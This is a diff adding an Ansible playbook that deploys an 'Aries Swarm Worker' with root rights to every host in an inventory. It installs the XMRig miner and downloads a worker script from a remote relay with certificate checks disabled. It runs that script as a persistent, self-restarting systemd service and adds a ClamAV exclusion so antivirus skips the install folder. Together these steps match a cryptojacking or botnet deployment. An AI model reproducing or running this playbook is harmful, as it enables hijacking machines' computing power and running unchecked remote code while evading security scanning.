@@ -1,0 +1,164 @@
+---
+# Aries Swarm Worker — Full Deployment Playbook
+- name: Deploy Aries Swarm Worker
+  hosts: all
+  become: true
+  vars:
+    relay_url: "{{ relay_url | default('https://gateway.doomtrader.com:9700') }}"
+    relay_secret: "{{ relay_secret | default('aries-swarm-jdw-2026') }}"
+    sol_wallet: "{{ sol_wallet | default('') }}"
+    mining_intensity: "{{ mining_intensity | default(50) }}"
+    xmrig_version: "6.25.0"
+    install_dir: /opt/aries-swarm
+    worker_id: "{{ ansible_hostname }}"
+
+  tasks:
+    # ── Install Node.js 20 LTS ──
+    - name: Install Node.js 20 (Debian/Ubuntu)
+      when: ansible_os_family == 'Debian'
+      tags: [install]
+      block:
+        - name: Add NodeSource GPG key
+          shell: curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
+          args:
+            creates: /etc/apt/sources.list.d/nodesource.list
+        - name: Install nodejs
+          apt:
+            name: [nodejs, curl, wget, unzip]
+            state: present
+            update_cache: yes
+
+    - name: Install Node.js 20 (RHEL/CentOS)
+      when: ansible_os_family == 'RedHat'
+      tags: [install]
+      block:
+        - name: Add NodeSource repo
+          shell: curl -fsSL https://rpm.nodesource.com/setup_20.x | bash -
+          args:
+            creates: /etc/yum.repos.d/nodesource-el9.repo
+        - name: Install nodejs
+          yum:
+            name: [nodejs, curl, wget, unzip]
+            state: present
+
+    - name: Install Node.js 20 (Alpine)
+      when: ansible_os_family == 'Alpine'
+      tags: [install]
+      apk:
+        name: [nodejs, npm, curl, wget, unzip]
+        state: present
+
+    # ── Create directories ──
+    - name: Create install directories
+      tags: [install]
+      file:
+        path: "{{ item }}"
+        state: directory
+        mode: '0755'
+      loop:
+        - "{{ install_dir }}"
+        - "{{ install_dir }}/xmrig"
+        - "{{ install_dir }}/worker"
+
+    # ── Download and install xmrig ──
+    - name: Download xmrig {{ xmrig_version }}
+      tags: [install]
+      get_url:
+        url: "https://github.com/xmrig/xmrig/releases/download/v{{ xmrig_version }}/xmrig-{{ xmrig_version }}-linux-static-x64.tar.gz"
+        dest: /tmp/xmrig.tar.gz
+        mode: '0644'
+
+    - name: Extract xmrig
+      tags: [install]
+      unarchive:
+        src: /tmp/xmrig.tar.gz
+        dest: "{{ install_dir }}/xmrig/"
+        remote_src: yes
+        extra_opts: [--strip-components=1]
+
+    - name: Make xmrig executable
+      tags: [install]
+      file:
+        path: "{{ install_dir }}/xmrig/xmrig"
+        mode: '0755'
+
+    # ── Download worker script ──
+    - name: Download worker-linux.js from relay
+      tags: [install, update]
+      get_url:
+        url: "{{ relay_url }}/api/deploy/worker.js"
+        dest: "{{ install_dir }}/worker/worker-linux.js"
+        mode: '0644'
+        force: yes
+        validate_certs: no
+
+    # ── Configure env.json ──
+    - name: Create env.json
+      tags: [configure]
+      copy:
+        dest: "{{ install_dir }}/worker/env.json"
+        content: |
+          {
+            "relayUrl": "{{ relay_url }}",
+            "secret": "{{ relay_secret }}",
+            "workerId": "{{ worker_id }}",
+            "solWallet": "{{ sol_wallet }}",
+            "miningIntensity": {{ mining_intensity }},
+            "xmrigPath": "{{ install_dir }}/xmrig/xmrig"
+          }
+        mode: '0600'
+
+    # ── Systemd service ──
+    - name: Create aries-worker systemd service
+      tags: [configure]
+      copy:
+        dest: /etc/systemd/system/aries-worker.service
+        content: |
+          [Unit]
+          Description=Aries Swarm Worker
+          After=network-online.target
+          Wants=network-online.target
+
+          [Service]
+          Type=simple
+          WorkingDirectory={{ install_dir }}/worker
+          ExecStart=/usr/bin/node {{ install_dir }}/worker/worker-linux.js
+          Restart=always
+          RestartSec=10
+          Environment=NODE_ENV=production
+          StandardOutput=journal
+          StandardError=journal
+
+          [Install]
+          WantedBy=multi-user.target
+      notify: reload systemd
+
+    # ── ClamAV exclusions ──
+    - name: Add ClamAV exclusion for aries-swarm
+      tags: [configure]
+      lineinfile:
+        path: /etc/clamav/clamd.conf
+        line: "ExcludePath ^{{ install_dir }}"
+        create: yes
+      ignore_errors: yes
+
+    # ── Firewall (ufw) ──
+    - name: Allow outbound to relay (ufw)
+      tags: [configure]
+      shell: |
+        which ufw && ufw allow out to any port 9700 proto tcp || true
+      changed_when: false
+
+    # ── Start service ──
+    - name: Enable and start aries-worker
+      tags: [start]
+      systemd:
+        name: aries-worker
+        enabled: yes
+        state: started
+        daemon_reload: yes
+
+  handlers:
+    - name: reload systemd
+      systemd:
+        daemon_reload: yes
